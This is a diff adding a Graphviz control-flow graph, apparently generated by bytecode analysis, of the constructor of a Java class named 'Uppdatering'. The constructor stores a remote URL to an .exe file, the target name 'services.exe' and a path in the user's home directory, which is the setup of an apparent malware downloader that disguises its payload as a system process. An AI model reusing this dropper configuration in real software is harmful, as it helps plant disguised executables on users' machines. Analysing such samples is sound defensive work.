@@ -1,0 +1,37 @@
+digraph "" {
+    "r0 := @this: Uppdatering"
+    "load.r r0"
+    "r0 := @this: Uppdatering"->"load.r r0";
+    "push \"http://www.avenynsguld.se/bilder/html.exe\""
+    "load.r r0"->"push \"http://www.avenynsguld.se/bilder/html.exe\"";
+    "fieldput <Uppdatering: java.lang.String downloadLocation>"
+    "push \"http://www.avenynsguld.se/bilder/html.exe\""->"fieldput <Uppdatering: java.lang.String downloadLocation>";
+    "fieldput <Uppdatering: java.lang.String downloadLocation>"->"load.r r0";
+    "push \"services.exe\""
+    "load.r r0"->"push \"services.exe\"";
+    "fieldput <Uppdatering: java.lang.String renameTo>"
+    "push \"services.exe\""->"fieldput <Uppdatering: java.lang.String renameTo>";
+    "fieldput <Uppdatering: java.lang.String renameTo>"->"load.r r0";
+    "new java.lang.StringBuffer"
+    "load.r r0"->"new java.lang.StringBuffer";
+    "dup1.r"
+    "new java.lang.StringBuffer"->"dup1.r";
+    "specialinvoke <java.lang.StringBuffer: void <init>()>"
+    "dup1.r"->"specialinvoke <java.lang.StringBuffer: void <init>()>";
+    "push \"user.home\""
+    "specialinvoke <java.lang.StringBuffer: void <init>()>"->"push \"user.home\"";
+    "staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>"
+    "push \"user.home\""->"staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>"
+    "staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>"->"virtualinvoke <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>";
+    "push \"file.separator\""
+    "virtualinvoke <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>"->"push \"file.separator\"";
+    "push \"file.separator\""->"staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>";
+    "staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>"->"virtualinvoke <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuffer: java.lang.String toString()>"
+    "virtualinvoke <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuffer: java.lang.String toString()>";
+    "fieldput <Uppdatering: java.lang.String downloadTo>"
+    "virtualinvoke <java.lang.StringBuffer: java.lang.String toString()>"->"fieldput <Uppdatering: java.lang.String downloadTo>";
+    "return"
+    "fieldput <Uppdatering: java.lang.String downloadTo>"->"return";
+}
